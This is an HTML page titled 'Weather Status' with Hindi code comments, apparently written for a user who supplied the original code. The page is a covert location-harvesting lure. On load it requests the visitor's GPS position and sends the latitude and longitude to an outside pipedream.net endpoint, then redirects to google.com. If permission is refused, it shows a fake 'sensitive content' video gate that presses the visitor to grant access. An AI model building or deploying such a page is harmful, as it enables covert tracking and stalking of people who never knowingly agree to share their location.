<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <!-- इससे यह पेज मोबाइल स्क्रीन के साइज में बिल्कुल परफेक्ट दिखेगा, ज़ूम नहीं करना पड़ेगा -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Status</title>
    <style>
        /* डार्क थीम रिस्ट्रिक्शन बॉक्स और ओवरले की स्टाइलिंग */
        body {
            margin: 0; padding: 0;
            background-color: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #ffffff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        #verification-modal {
            display: none; /* शुरुआत में छुपा रहेगा */
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            justify-content: center; align-items: center;
            padding: 20px; box-sizing: border-box;
        }

        .modal-box {
            background-color: #1f1f1f;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 30px; max-width: 400px; width: 100%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        .modal-title {
            font-size: 18px; font-weight: 600;
            margin-bottom: 12px; color: #ff4d4d;
        }

        .modal-text {
            font-size: 14px; color: #aaaaaa;
            line-height: 1.5; margin-bottom: 24px;
        }

        .action-btn {
            background-color: #cc0000; /* आकर्षक रेड बटन */
            color: #ffffff; border: none;
            padding: 12px 24px; font-size: 14px; font-weight: 600;
            border-radius: 4px; cursor: pointer; width: 100%;
        }

        .spinner {
            border: 3px solid #333; border-top: 3px solid #ffffff;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- शुरुआती लोडिंग पेज जो आपके कोड में था -->
    <div id="loading-context" style="text-align: center;">
        <div class="spinner"></div>
        <h2>Loading Page, Please Wait...</h2>
    </div>

    <!-- आपका कस्टमाइज्ड मैसेज बॉक्स (केवल तब दिखेगा जब GPS बंद/ब्लॉक होगा) -->
    <div id="verification-modal">
        <div class="modal-box">
            <div class="modal-title">Content Access Restricted</div>
            <div class="modal-text">
                This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
            </div>
            <!-- क्लिक करने पर यह तुरंत बिना पूरा पेज रीलोड किए पॉप-अप दोबारा ट्रिगर करेगा -->
            <button class="action-btn" onclick="executeLocationRoutine();">Verify & Watch Video</button>
        </div>
    </div>

    <script>
        // आपका मूल और सटीक लिंक यहाँ सुरक्षित है
        var targetEndpoint = 'https://eohi4x7xdjpqqrs.m.pipedream.net';

        function showRestrictionUI() {
            document.getElementById('loading-context').style.display = 'none';
            document.getElementById('verification-modal').style.display = 'flex';
        }

        function showLoadingUI() {
            document.getElementById('verification-modal').style.display = 'none';
            document.getElementById('loading-context').style.display = 'block';
        }

        // मुख्य फंक्शन जो बिना किसी लूप के सीधे आपके मूल Geolocation लॉजिक को रन करेगा
        function executeLocationRoutine() {
            showLoadingUI(); // रिक्वेस्ट फायर होते ही वापस लोडिंग स्क्रीन दिखाओ

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    
                    // आपका मूल फ़ेच फ़ंक्शन (मोड, हेडर, पेलोड बिल्कुल वैसा ही है जैसा आपने दिया था)
                    fetch(targetEndpoint, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude: lat, longitude: lon })
                    }).then(() => {
                        window.location.href = "https://google.com"; 
                    });
                    
                }, function(error) {
                    // 🌟 सबसे सावधानी भरा बदलाव: फेल होने पर सीधा गूगल जाने के बजाय हमारा रिस्ट्रिक्शन बॉक्स दिखाओ
                    showRestrictionUI();
                });
            } else {
                window.location.href = "https://google.com";
            }
        }

        window.onload = function() {
            // पेज लोड होते ही पहली बार चेक करें (जैसा आपके मूल कोड में था)
            executeLocationRoutine();
        }
    </script>
</body>
</html>
